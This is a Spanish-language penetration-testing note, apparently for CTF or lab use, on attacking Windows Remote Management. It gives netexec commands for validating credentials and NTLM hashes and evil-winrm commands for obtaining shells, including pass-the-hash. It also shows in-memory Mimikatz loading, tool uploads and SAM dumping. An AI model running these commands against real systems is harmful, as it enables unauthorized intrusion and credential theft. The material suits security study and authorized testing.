# WinRM (Windows Remote Management)

> **Puerto por defecto:** `5985/TCP` (HTTP) · `5986/TCP` (HTTPS)

WinRM es el servicio de administración remota de Windows (equivalente a SSH en el mundo Windows). Si tienes **credenciales válidas** (o un **hash NTLM**) de un usuario que pertenece al grupo *Remote Management Users* o es administrador local, WinRM te da una **shell interactiva** con `evil-winrm`.

---

## Enumeración

```bash
nmap -p5985,5986 -sCV <IP>
```

Comprueba si unas credenciales son válidas para WinRM con **netexec**:

```bash
netexec winrm <IP> -u <usuario> -p <pass>
netexec winrm <IP> -u <usuario> -H <hash_NTLM>
```

Un resultado con `(Pwn3d!)` significa que ese usuario **puede** abrir shell por WinRM.

> **Consejo:** cuando crackees o encuentres credenciales en una máquina Windows/AD, lo primero es pasarlas por `netexec winrm` (y también `smb`). Si ves `Pwn3d!`, ya tienes shell.

---

## Shell con evil-winrm

La herramienta de referencia:

```bash
# Con contraseña
evil-winrm -i <IP> -u <usuario> -p '<pass>'

# Pass-the-Hash (sin contraseña, solo el hash NTLM)
evil-winrm -i <IP> -u <usuario> -H <hash_NTLM>

# Con certificados (WinRM sobre HTTPS / PKINIT)
evil-winrm -i <IP> -u <usuario> -c cert.pem -k key.pem -S
```

### Funciones útiles de evil-winrm

Ya dentro de la shell, evil-winrm trae utilidades:

```text
upload <local> <remoto>      # subir un archivo (p.ej. winpeas.exe)
download <remoto> <local>    # descargar (p.ej. para loot)
menu                         # ver funciones extra
```

Carga de scripts/binarios en memoria:

```text
# Coloca tus scripts en el dir indicado con -s al arrancar evil-winrm
evil-winrm -i <IP> -u user -p pass -s /ruta/scripts/
# dentro:  Invoke-Mimikatz.ps1   (se carga en memoria)
```

---

## Qué hacer tras conseguir shell

```powershell
whoami /priv          # privilegios -> ¿SeImpersonate, SeBackup...?
whoami /groups
type C:\Users\<user>\Desktop\user.txt
```

A partir de aquí, escalada de privilegios Windows (ver la nota correspondiente). Si el usuario es administrador local, lee flags, vuelca SAM, etc.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `evil-winrm` | Shell interactiva por WinRM (password, PtH, uploads). |
| `netexec winrm` | Validar credenciales/hashes y detectar `Pwn3d!`. |
| `crackmapexec` | Alternativa clásica (predecesor de netexec). |

---

> **Consejo:** WinRM es, junto con SMB, la vía de entrada más cómoda en máquinas Windows una vez tienes credenciales. El patrón de oro en Active Directory es: consigues un hash o contraseña (Kerberoasting, AS-REP, dump de SAM) → `netexec winrm` para ver dónde funciona → `evil-winrm` para la shell. Y recuerda que **no necesitas la contraseña**: con el hash NTLM y `-H` entras igual (Pass-the-Hash).
